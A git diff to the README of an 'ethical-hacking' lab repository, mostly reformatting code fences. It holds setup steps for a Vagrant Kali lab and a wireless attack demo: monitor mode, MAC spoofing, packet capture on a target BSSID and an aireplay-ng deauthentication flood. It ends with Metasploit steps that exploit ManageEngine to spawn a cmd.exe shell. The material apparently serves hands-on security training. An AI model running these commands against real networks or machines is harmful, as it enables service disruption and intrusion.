@@ -65,54 +65,54 @@ A wireless Adapter that supports monitor mode and packet injection
 1. Open Powershell; Clone the repo.
    ```sh
    git clone https://github.com/souja67/ethical-hacking.git
-
-![image](https://user-images.githubusercontent.com/25991921/126594021-68f29970-c758-42a5-8b15-56cc6312bb43.png)
+   ```
+   ![image](https://user-images.githubusercontent.com/25991921/126594021-68f29970-c758-42a5-8b15-56cc6312bb43.png)
 
 2. Change to repository directory.
    ```sh
    cd .\ethcical-hacking\
-
-![image](https://user-images.githubusercontent.com/25991921/126594133-f202fe6d-ba5d-4b65-be2e-c1e2305f7fac.png)
+   ```
+   ![image](https://user-images.githubusercontent.com/25991921/126594133-f202fe6d-ba5d-4b65-be2e-c1e2305f7fac.png)
 
 3. Install Virtualbox Extension Pack.
-    ```sh
-    & "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" extpack install .\misc\Oracle_VM_VirtualBox_Extension_Pack-6.1.24.vbox-extpack
-
-![image](https://user-images.githubusercontent.com/25991921/126594375-f2d1a871-718e-4710-8729-9611441fd1b9.png)
+   ```sh
+   & "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" extpack install .\misc\Oracle_VM_VirtualBox_Extension_Pack-6.1.24.vbox-extpack
+   ```
+   ![image](https://user-images.githubusercontent.com/25991921/126594375-f2d1a871-718e-4710-8729-9611441fd1b9.png)
 
 4. Accept License Agreement.
-    ```sh
-    Type 'y' to accept; press Enter
-
-![image](https://user-images.githubusercontent.com/25991921/126594441-d223dff2-80ad-4256-9220-2dddc2bf6f68.png)
+   ```sh
+   Type 'y' to accept; press Enter
+   ```
+   ![image](https://user-images.githubusercontent.com/25991921/126594441-d223dff2-80ad-4256-9220-2dddc2bf6f68.png)
 
 5. Deploy initial virtual environment (Will take some time depending on internet connection).
    ```sh
    vagrant up
-
-![image](https://user-images.githubusercontent.com/25991921/126594631-b196abc5-95e7-4317-a1f1-92b734e2240d.png)
+   ```
+   ![image](https://user-images.githubusercontent.com/25991921/126594631-b196abc5-95e7-4317-a1f1-92b734e2240d.png)
 
 6. Need to shutdown our Kali virtual machine temporarily.
    ```sh
    vagrant halt kali
-
-![image](https://user-images.githubusercontent.com/25991921/126594935-d0d166f9-07cc-472d-bf9e-c65026d1232f.png)
+   ```
+   ![image](https://user-images.githubusercontent.com/25991921/126594935-d0d166f9-07cc-472d-bf9e-c65026d1232f.png)
 
 7. Open Virtualbox; Go to settings of Kali virtual machine. <br>
 
-![image](https://user-images.githubusercontent.com/25991921/126595881-c7721324-cf17-432d-abff-affb2cbacf30.png)
+   ![image](https://user-images.githubusercontent.com/25991921/126595881-c7721324-cf17-432d-abff-affb2cbacf30.png)
 
 8. Enable USB controller on Kali virtual machine. <br>
 
-![image](https://user-images.githubusercontent.com/25991921/126596146-9fe4b7f6-94c5-4c96-ab45-1d8cc38c1c07.png)
+   ![image](https://user-images.githubusercontent.com/25991921/126596146-9fe4b7f6-94c5-4c96-ab45-1d8cc38c1c07.png)
 
 9. Power on Kali virtual machine
    ```sh
    vagrant up kali
-
+   ```
 10. Plugin USB wireless adapter and add it to Kali virtual machine.
 
-![image](https://user-images.githubusercontent.com/25991921/126593831-2560bc2f-5b99-4a72-a044-5522c4092bca.png)
+   ![image](https://user-images.githubusercontent.com/25991921/126593831-2560bc2f-5b99-4a72-a044-5522c4092bca.png)
 
    
 
@@ -135,35 +135,38 @@ A wireless Adapter that supports monitor mode and packet injection
 ## Wireless Penetration Testing Demo
 
 1. Login to Kali Linux virtual machine <br>
-    ```sh
-    username: vagrant
-    password: vagrant
-
-![image](https://user-images.githubusercontent.com/25991921/126595162-1e1f5036-a61a-4905-abaf-6d252ca240db.png)
+   ```sh
+   username: vagrant
+   password: vagrant
+   ```
+   ![image](https://user-images.githubusercontent.com/25991921/126595162-1e1f5036-a61a-4905-abaf-6d252ca240db.png)
 
 2. Open Terminal; Check to make sure wireless adapter exist
-    ```sh
-    sudo ifconfig | grep wlan0
-
-![image](https://user-images.githubusercontent.com/25991921/126598327-0d9f9c4c-549f-4aa3-836b-9a6ac9509095.png)
+   ```sh
+   sudo ifconfig | grep wlan0
+   ```
+   ![image](https://user-images.githubusercontent.com/25991921/126598327-0d9f9c4c-549f-4aa3-836b-9a6ac9509095.png)
 
 
 3. Kill any potential problem processes within Kali Linux virtual machine
-    ```sh
-    sudo airmon-ng check kill
-
+   ```sh
+   sudo airmon-ng check kill
+   ```
+   
 4. Set wireless adapter to monitor mode (Managed mode by default)
-    ```sh
-    sudo airmon-ng start wlan0
-
+   ```sh
+   sudo airmon-ng start wlan0
+   ```
+   
 5. Set wireless adapter offline
-    ```sh
-    sudo ifconfig wlan0 down    
-
+   ```sh
+   sudo ifconfig wlan0 down    
+   ```
 6. Change MAC Address
-    ```sh
-    sudo macchanger -r wlan0
-
+   ```sh
+   sudo macchanger -r wlan0
+   ```
+   
 7. Start sniffing wireless packets
     ```sh
     sudo airodump-ng wlan0
@@ -171,24 +174,24 @@ A wireless Adapter that supports monitor mode and packet injection
 8. Find target wifi access point to be PWND!
 
 9. Filter packets down to focus on viction wifi access point
-    ```sh
-    airodump-ng -c 11 --bssid CC:E1:D5:30:51:F8-w ~/ethical-hacking/misc/hack-01 wlan0
-
-* airodump-ng : For packet capturing
-* -c : Channel
-* –bssid : MAC address of a wireless access point(WAP).
-* -w : The Directory where you want to save the file(Password File).
-* wlan0 : Name of the interface.
+   ```sh
+   airodump-ng -c 11 --bssid CC:E1:D5:30:51:F8-w ~/ethical-hacking/misc/hack-01 wlan0
+   ```
+   * airodump-ng : For packet capturing
+   * -c : Channel
+   * –bssid : MAC address of a wireless access point(WAP).
+   * -w : The Directory where you want to save the file(Password File).
+   * wlan0 : Name of the interface.
 
 10. Deauthorize client from wifi network
-    ```sh
-    aireplay-ng -0 99 -a CC:E1:D5:30:51:F8 wlan0
-
-* aireplay-ng : To inject frames
-* -0 : For deauthentication
-* 10 : No. of deauthentication packets to be sent
-* -a : For the bssid of the target network
-* wlan0 : Name of the interface. 
+   ```sh
+   aireplay-ng -0 99 -a CC:E1:D5:30:51:F8 wlan0
+   ```
+   * aireplay-ng : To inject frames
+   * -0 : For deauthentication
+   * 10 : No. of deauthentication packets to be sent
+   * -a : For the bssid of the target network
+   * wlan0 : Name of the interface. 
 <br>
 <br>
 
@@ -201,9 +204,9 @@ A wireless Adapter that supports monitor mode and packet injection
 3. searchsploit 
 3. msfconsole
 4. use exploit /windows/http/manageengine_connectionid_write
-5. set RHOST 192.168.56.103. *Remember there's two IP's configured. if one IP doesn’t work, try the other one*
+5. set RHOST 192.168.22.11. *Remember there's two IP's configured. if one IP doesn’t work, try the other one*
 6. set RPORT 8383
 7. set SSL true
-8. set LHOST 192.168.90.5
+8. set LHOST 192.168.22.10
 9. execute -f cmd.exe -i -H
 10. hostname / whoami
